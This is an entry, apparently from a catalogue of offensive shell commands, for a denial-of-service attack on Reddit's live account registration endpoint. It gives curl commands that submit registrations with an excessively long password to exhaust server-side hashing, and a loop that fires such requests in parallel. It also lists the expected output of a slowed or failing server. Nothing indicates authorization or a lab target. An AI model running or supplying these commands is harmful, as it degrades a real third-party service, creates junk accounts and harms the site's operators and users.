---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST https://www.reddit.com/register -H "Content-Type:
  application/x-www-form-urlencoded" -d "username=test$(date
  +%s)&email=test$(date +%s)@example.com&password=$(cat long_password.txt)"
tags:
  - dos
  - web
  - post-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows (with curl)
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:30.493Z'
verified: false
validated: true
submitted: true
---
# curl-submit-long-password

## Command

```bash
curl -X POST https://www.reddit.com/register -H "Content-Type: application/x-www-form-urlencoded" -d "username=test$(date +%s)&email=test$(date +%s)@example.com&password=$(cat long_password.txt)"
```

## Description

This command simulates submitting a Reddit account registration form with an excessively long password read from a file, exploiting resource exhaustion during server-side hashing. Use it to test DoS vulnerabilities in registration endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Content-Type: ..."` | Sets the request header for form data | Yes |
| `-d "..."` | Provides the form data including username, email, and password | Yes |
| `$(date +%s)` | Generates unique timestamp for username/email to avoid duplicates | No |
| `$(cat long_password.txt)` | Inserts the long password from file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.reddit.com/register -H "Content-Type: application/x-www-form-urlencoded" -d "username=testuser&email=test@example.com&password=very_long_string_here"
```

### Advanced Usage

```bash
for i in {1..5}; do curl -X POST https://www.reddit.com/register -H "Content-Type: application/x-www-form-urlencoded" -d "username=test$i&email=test$i@example.com&password=$(cat long_password.txt)" & done
```

## Expected Output

A delayed HTTP response (e.g., 200 OK after 10+ seconds) or error (500 Internal Server Error/timeout) indicating resource strain from hashing the large password.

## Related

- [[commands/generate-long-password]]
- [[procedures/Submit-Excessive-Password-for-DoS]]
